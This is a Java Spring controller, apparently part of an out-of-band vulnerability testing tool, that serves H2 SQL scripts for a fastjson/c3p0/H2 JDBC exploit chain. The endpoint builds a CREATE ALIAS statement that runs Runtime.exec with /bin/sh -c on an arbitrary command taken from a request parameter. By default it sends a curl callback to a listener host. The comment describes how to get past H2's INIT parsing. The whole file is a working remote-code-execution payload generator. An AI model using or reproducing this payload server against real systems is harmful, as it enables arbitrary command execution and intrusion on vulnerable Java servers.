package com.oobx.controller;

import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

/**
 * Serves H2 INIT SQL scripts dynamically for jchains_fastjson_c3p0_h2.
 * H2 JDBC URL parser truncates INIT= at semicolons (even inside $$...$$).
 * Workaround: use RUNSCRIPT FROM 'http://sidecar:8711/h2-script?tok=TOKEN12'
 * so the SQL is fetched as a file (not URL parameter) and has no parsing issue.
 */
@RestController
public class H2ScriptController {

    @GetMapping("/h2-script")
    public ResponseEntity<String> h2Script(
            @RequestParam("tok") String tok,
            @RequestParam(value = "cmd", required = false, defaultValue = "") String cmd) {
        // Build H2 alias + call SQL — semicolons inside are fine in a script file
        String oobxFile = "/tmp/oobx_" + tok;
        // Use tok to call back to OOBserver
        String callbackCmd = cmd.isEmpty()
            ? "curl -sk http://host.docker.internal:8010/callback/http/" + tok + "/rce -o " + oobxFile
            : cmd;
        String safe = callbackCmd.replace("\\", "\\\\").replace("'", "''");
        String sql = "CREATE ALIAS IF NOT EXISTS OOBX_" + tok.substring(0, 6).toUpperCase()
            + " AS 'void oobx(String c) throws Exception {"
            + " Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",c}); }'; "
            + "CALL OOBX_" + tok.substring(0, 6).toUpperCase() + "('" + safe + "');";
        return ResponseEntity.ok()
            .contentType(MediaType.TEXT_PLAIN)
            .body(sql);
    }
}
